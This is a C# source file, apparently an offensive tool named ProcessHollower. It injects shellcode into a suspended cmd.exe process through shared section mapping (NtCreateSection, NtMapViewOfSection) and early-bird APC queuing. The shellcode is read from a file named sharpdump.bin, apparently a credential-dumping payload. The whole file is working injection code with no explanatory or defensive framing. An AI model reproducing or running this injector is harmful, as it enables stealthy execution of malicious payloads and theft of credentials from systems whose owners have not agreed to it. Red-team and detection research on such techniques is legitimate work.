using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;

namespace ProcessHollower
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInherithandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("ntdll.dll")]
        static extern uint NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes, ref ulong MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll")]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, out IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, IntPtr SectionOffset, out ulong ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll")]
        static extern uint NtCreateThreadEx(out IntPtr threadhandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessW(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lptartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, uint dwData);

        [DllImport("kernel32.dll")]
        static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            //byte[] shellcode;

            /*
            byte[] shellcode = new byte[] {
                };
            */

            //byte[] shellcode = File.ReadAllBytes("C:\\Users\\vadbfp\\tools\\test-shellcodes\\sharpdump.bin");
            byte[] shellcode = File.ReadAllBytes("D:\\sharpdump.bin");
            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            var pa = new SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);
            var ta = new SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);
            var pi = new PROCESS_INFORMATION();

            var hSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            var success = CreateProcessW("D:\\cmd.exe", null, ref ta, ref pa, false, 0x00000004, IntPtr.Zero, "D:\\", ref si, out pi);
            if (!success)
                throw new Win32Exception(Marshal.GetLastWin32Error());
            var target = pi.hProcess;

            NtCreateSection(ref hSection, 0x10000000, IntPtr.Zero, ref maxSize, 0x40, 0x08000000, IntPtr.Zero);
            NtMapViewOfSection(hSection, (IntPtr)(-1), out var localBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out var _, 2, 0, 0x04);
            Marshal.Copy(shellcode, 0, localBaseAddress, shellcode.Length);
            NtMapViewOfSection(hSection, target, out var remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out var _, 2, 0, 0x20);

            QueueUserAPC(remoteBaseAddress, pi.hThread, 0);
            
            ResumeThread(pi.hThread);
            //Thread.Sleep(60000);
        }
    }
}
